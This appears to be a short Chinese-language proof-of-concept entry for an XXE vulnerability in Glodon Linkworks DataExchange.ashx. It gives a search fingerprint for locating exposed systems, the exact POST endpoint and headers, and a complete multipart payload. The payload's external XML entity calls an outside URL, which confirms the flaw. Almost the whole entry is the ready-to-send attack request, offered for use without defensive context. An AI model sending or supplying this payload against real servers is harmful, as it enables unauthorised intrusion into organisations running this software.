# 广联达LinkworksDataExchange.ashxXXE漏洞

- **系统**：广联达LinkworksDataExchange.ashx　|　**类型**：XXE　|　**CVE**：—
- **指纹**：`body="Services/Identification/login.ashx"`
- **请求**：`POST /GB/LK/Document/DataExchange/DataExchange.ashx HTTP/1.1`
- **关键头**：`Content-Type: multipart/form-data;boundary=----WebKitFormBoundaryJGgV5l5ta…`　`Purpose: prefetch`　`Sec-Purpose: prefetch;prerender`

**请求体 / payload**
```
------WebKitFormBoundaryJGgV5l5ta05yAIe0
Content-Disposition: form-data;name="SystemName"
BIM
------WebKitFormBoundaryJGgV5l5ta05yAIe0
Content-Disposition: form-data;name="Params"
Content-Type: text/plain
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE test [
<!ENTITY t SYSTEM "http://www.baidu.com">
]
>
<test>&t;</test>
------WebKitFormBoundaryJGgV5l5ta05yAIe0--
```
- **预期**：200　|　—